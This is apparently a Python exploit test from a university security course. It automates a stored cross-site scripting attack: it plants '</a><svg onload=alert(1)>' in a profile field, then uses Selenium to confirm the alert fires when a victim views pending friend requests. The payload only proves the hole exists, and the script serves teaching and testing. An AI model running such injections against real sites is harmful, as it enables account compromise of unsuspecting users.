import requests, sys, os, random
import time
from selenium_utils import start_driver, write_to_field

SERVER = sys.argv[1]
# SERVER = 'http://d39e092608f9769e2696bf07d987072b4b2dd1dc9bce5e0151910fc276ae.project.ssof.rnl.tecnico.ulisboa.pt'

session = requests.session()

# Random users credentials 
attacker_user = str(random.randint(2**27, 2**28))
attacker_password = str(random.randint(2**27, 2**28))

victim_user = str(random.randint(2**27, 2**28))
victim_password = str(random.randint(2**27, 2**28))

# Registration of the users
params = {'password' : attacker_password, 'username' : attacker_user}
r = session.post(SERVER + '/register', data=params)

params = {'password' : victim_password, 'username' : victim_user}
r = session.post(SERVER + '/register', data=params)

# Login of the attacker
params = {'password' : attacker_password, 'username' : attacker_user}
r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

# Update about section
files = {'photo': ('','','application/octet-stream')}
payload = '</a><svg onload=alert(1)>'
data = {'username': attacker_user, 'name': '', 'currentpassword': attacker_password, 'newpassword': '', 'about' : payload}
r = session.post(SERVER + '/update_profile', data=data, files=files, cookies=session.cookies)

# Attacker sends friend request to victim
payload = {'username': victim_user}
r = session.post(SERVER + '/request_friend', data=payload, cookies=session.cookies)

# Use Selenium to check for the alert
driver = start_driver()
driver.get(SERVER)

# Login
write_to_field(driver, 'username', victim_user)
write_to_field(driver, 'password', victim_password + '\n')

# Go to pending requests page
driver.get(SERVER + '/pending_requests')

# Verify and Handle alert
alert = driver.switch_to.alert
time.sleep(1)
assert "1" in alert.text
alert.accept()

# Close Chrome
driver.close()